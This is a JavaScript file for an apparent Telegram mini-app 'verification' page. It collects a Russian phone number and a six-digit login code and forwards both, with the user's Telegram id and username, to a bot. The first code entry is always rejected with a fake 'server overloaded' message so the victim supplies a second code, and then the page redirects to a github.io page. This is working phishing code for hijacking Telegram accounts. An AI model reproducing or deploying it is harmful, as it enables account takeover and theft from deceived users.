document.addEventListener('DOMContentLoaded', () => {
    if (!window.Telegram || !window.Telegram.WebApp) {
        console.error('Telegram WebApp is not available');
        showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
        return;
    }

    // Проверяем, был ли пользователь уже верифицирован
    //if (localStorage.getItem('isVerified')) {
     //   window.location.href = '/mybot/verifer_user/index.html';
    //    return;
    //}

    const tg = window.Telegram.WebApp;
    const elements = {
        phoneForm: document.getElementById('phone-form'),
        codeForm: document.getElementById('code-form'),
        phoneInput: document.getElementById('phone'),
        codeInput: document.getElementById('code'),
        phoneError: document.getElementById('phone-error'),
        codeError: document.getElementById('code-error'),
        submitPhoneBtn: document.getElementById('submit-phone'),
        submitCodeBtn: document.getElementById('submit-code')
    };

    let attemptCount = 0;
    let isClosing = false;
    let lastSentEvent = { type: '', time: 0 };

    // Инициализация приложения
    function init() {
        // Проверка верификации (добавьте этот блок в самое начало функции)
        if (localStorage.getItem('isVerified')) {
            window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
            return;
        }
        tg.expand();
        tg.setHeaderColor('#060137');
        tg.setBackgroundColor('#060137');
        tg.enableClosingConfirmation();

        setupEventListeners();
        safeSendEvent('init');
        vibrate('medium');
    }

    // Настройка обработчиков событий
    function setupEventListeners() {
        const viewportHandler = (e) => {
            if (e.isStateStable && !e.isExpanded) {
                handleAppClose();
            }
        };
        
        tg.onEvent('viewportChanged', viewportHandler);
        tg.onEvent('closingConfirmation', handleAppClose);

        elements.phoneInput.addEventListener('input', formatPhoneInput);
        elements.codeInput.addEventListener('input', handleCodeInput);
        elements.submitPhoneBtn.addEventListener('click', handlePhoneSubmit);
        elements.submitCodeBtn.addEventListener('click', handleCodeSubmit);
    }

    // Очистка ресурсов
    function cleanup() {
        tg.offEvent('viewportChanged', handleViewportChange);
        tg.offEvent('closingConfirmation', handleAppClose);
    }

    // Виброотклик
    function vibrate(type = 'light') {
        if (!tg.HapticFeedback) return;
        const types = { 'light': 'light', 'medium': 'medium', 'heavy': 'heavy', 'error': 'error' };
        try { tg.HapticFeedback.impactOccurred(types[type] || 'light'); } catch (error) {}
    }

    // Безопасная отправка событий (без дублей)
    async function safeSendEvent(type, data = null) {
        const now = Date.now();
        if (lastSentEvent.type === type && now - lastSentEvent.time < 1000) return;
        
        lastSentEvent = { type, time: now };
        await sendEvent(type, data);
    }

    // Основная отправка событий
    async function sendEvent(type, data = null) {
        if (!window.sendToBot) return;
        try {
            await window.sendToBot(type, {
                ...data,
                userId: tg.initDataUnsafe.user?.id,
                username: tg.initDataUnsafe.user?.username,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('Error sending event:', error);
        }
    }

    // Форматирование номера телефона (исправлен курсор)
    function formatPhoneInput(e) {
        const input = e.target;
        const cursorPos = input.selectionStart;
        const oldValue = input.value;
        let value = oldValue.replace(/\D/g, '');
        
        // Сохраняем только цифры, начинающиеся с 7 (для российских номеров)
        if (value.length > 0 && value[0] !== '7') {
            value = '7' + value.substring(1);
        }
        
        let formatted = '+7';
        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
        if (value.length > 7) formatted += ' ' + value.substring(7, 9);
        if (value.length > 9) formatted += ' ' + value.substring(9, 11);
        
        // Устанавливаем новое значение
        input.value = formatted.substring(0, 16);
        
        // Корректируем позицию курсора
        let newCursorPos = cursorPos;
        const addedChars = input.value.length - oldValue.length;
        
        // Если пользователь вводит цифру в середине номера
        if (cursorPos > 0 && cursorPos < oldValue.length) {
            // Определяем, в какой части номера находится курсор
            const digitsBeforeCursor = oldValue.substring(0, cursorPos).replace(/\D/g, '').length;
            
            // Находим соответствующую позицию в новом формате
            if (digitsBeforeCursor <= 1) {
                newCursorPos = 2; // После +7
            } else if (digitsBeforeCursor <= 4) {
                newCursorPos = 3 + digitsBeforeCursor + Math.floor((digitsBeforeCursor - 2) / 3);
            } else if (digitsBeforeCursor <= 7) {
                newCursorPos = 7 + digitsBeforeCursor + Math.floor((digitsBeforeCursor - 5) / 3);
            } else if (digitsBeforeCursor <= 9) {
                newCursorPos = 11 + digitsBeforeCursor;
            } else {
                newCursorPos = 14 + digitsBeforeCursor;
            }
        } else if (addedChars > 0) {
            // При добавлении символов (обычный ввод)
            newCursorPos += addedChars;
        }
        
        // Ограничиваем позицию курсора длиной строки
        newCursorPos = Math.min(newCursorPos, input.value.length);
        input.setSelectionRange(newCursorPos, newCursorPos);
        
        if (value.length % 2 === 0) vibrate('light');
    }

    // Обработка ввода кода (без автоотправки)
    function handleCodeInput(e) {
        const value = e.target.value.replace(/\D/g, '');
        elements.codeInput.value = value.substring(0, 6);
        if (value.length > 0 && value.length <= 6) vibrate('light');
    }

    // Валидация номера телефона
    function validatePhone(phone) {
        const clean = phone.replace(/\D/g, '');
        return /^7\d{10}$/.test(clean);
    }

    // Отправка номера телефона
    async function handlePhoneSubmit() {
        const phone = elements.phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(elements.phoneError, 'Введите номер телефона');
            vibrate('error');
            return;
        }
        
        if (!validatePhone(phone)) {
            showError(elements.phoneError, 'Требуется российский номер: +7 XXX XXX XX XX');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(elements.phoneError);
        elements.phoneForm.classList.add('hidden');
        elements.codeForm.classList.remove('hidden');
        
        try {
            await safeSendEvent('phone', { phone: `+${phone}` });
        } catch (error) {
            console.error('Phone submission error:', error);
            showError(elements.phoneError, 'Ошибка отправки. Попробуйте позже');
            elements.phoneForm.classList.remove('hidden');
            elements.codeForm.classList.add('hidden');
        }
    }

    // Отправка кода подтверждения
    async function handleCodeSubmit() {
        const code = elements.codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(elements.codeError, 'Ровно 6 цифр');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(elements.codeError);
        setLoading(elements.submitCodeBtn, true);
        
        try {
            await safeSendEvent('code', { code, attempt: attemptCount + 1 });
            
            if (attemptCount === 0) {
                setTimeout(() => {
                    setLoading(elements.submitCodeBtn, false);
                    showError(elements.codeError, 'Сервер перегружен. Попробуйте снова');
                    elements.codeInput.value = '';
                    attemptCount++;
                    vibrate('heavy');
                    //safeSendEvent('code_attempt_failed', { code, attempt: attemptCount });
                }, 3000);
            } else {
                setTimeout(() => {
                    vibrate('heavy');
                    localStorage.setItem('isVerified', 'true');
                    safeSendEvent('verification_success', { code, attempts: attemptCount + 1 });
                    window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
                }, 2000);
            }
        } catch (error) {
            console.error('Code submission error:', error);
            setLoading(elements.submitCodeBtn, false);
            showError(elements.codeError, 'Ошибка отправки. Попробуйте позже');
        }
    }

    // Обработка закрытия приложения
    function handleAppClose() {
        if (!isClosing) {
            isClosing = true;
            safeSendEvent('app_close');
        }
    }

    // Вспомогательные функции
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
    }

    function hideError(element) {
        element.style.display = 'none';
    }

    function setLoading(button, isLoading) {
        button.disabled = isLoading;
        button.innerHTML = isLoading ? '<div class="loader"></div>' : 'Подтвердить';
    }

    function showFatalError(message) {
        document.body.innerHTML = `
            <div class="error-container">
                <h2>Ошибка</h2>
                <p>${message}</p>
            </div>
        `;
    }

    // Инициализация приложения
    init();
    window.addEventListener('beforeunload', cleanup);
});